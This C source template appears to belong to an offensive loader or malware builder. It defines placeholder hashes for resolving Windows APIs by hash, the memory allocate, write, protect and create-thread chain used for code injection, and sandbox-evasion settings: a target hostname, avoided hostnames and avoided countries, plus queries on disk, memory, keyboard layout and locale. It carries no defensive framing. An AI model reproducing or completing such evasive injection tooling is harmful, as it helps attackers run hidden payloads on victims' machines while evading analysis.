#include "definitions.h"

// hash, rotation_value, is_rotation_right

const ObjHash NTDLL_HASH = %MODHASH__ntdll.dll%;
const ObjHash USER32_HASH = %MODHASH__user32.dll%;
const ObjHash KERNEL32_HASH = %MODHASH__kernel32.dll%;

const ObjHash LOAD_LIBRARY_HASH = %FCTHASH__LoadLibraryA%;
const ObjHash QUERY_INFORMATION_PROCESS_HASH = %FCTHASH__NtQueryInformationProcess%;
const ObjHash GET_COMPUTER_NAME_HASH = %FCTHASH__GetComputerNameA%;
const ObjHash GET_DISK_FREE_SPACE_HASH = %FCTHASH__GetDiskFreeSpaceExA%;
const ObjHash GET_SYSTEM_INFO_HASH = %FCTHASH__GetSystemInfo%;
const ObjHash GET_KEYBOARD_LAYOUT_HASH = %FCTHASH__GetKeyboardLayout%;
const ObjHash GLOBAL_MEMORY_STATUS_HASH = %FCTHASH__GlobalMemoryStatusEx%;

const ObjHash GET_SYSTEM_DEFAULT_LANGID_HASH = %FCTHASH__GetSystemDefaultLangID%;
const ObjHash GET_SYSTEM_DEFAULT_LCID_HASH = %FCTHASH__GetSystemDefaultLCID%;

const ObjHash VIRTUAL_ALLOC_HASH = %FCTHASH__NtAllocateVirtualMemory%;
const ObjHash WRITE_MEMORY_HASH = %FCTHASH__NtWriteVirtualMemory%;
const ObjHash VIRTUAL_PROTECT_HASH = %FCTHASH__NtProtectVirtualMemory%;
const ObjHash CREATE_THREAD_HASH = %FCTHASH__NtCreateThreadEx%;
const ObjHash WAIT_FOR_SINGLE_OBJECT_HASH = %FCTHASH__NtWaitForSingleObject%;


// will change this to hashes
const ObjHash TARGET_HOSTNAME_PREFIX_HASH = %SANDBOX__TARGET_HOSTNAME%;
const ObjHash AVOIDED_HOSTNAME_PREFIX_HASHES[] = {
    %SANDBOX__AVOID_HOSTNAME%
};

const uint16_t AVOIDED_COUNTRIES[] = {
    %SANDBOX__AVOID_COUNTRIES%
};

const size_t AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE = sizeof(AVOIDED_HOSTNAME_PREFIX_HASHES) / sizeof(AVOIDED_HOSTNAME_PREFIX_HASHES[0]);
const size_t AVOIDED_COUNTRIES_SIZE = sizeof(AVOIDED_COUNTRIES) / sizeof(AVOIDED_COUNTRIES[0]);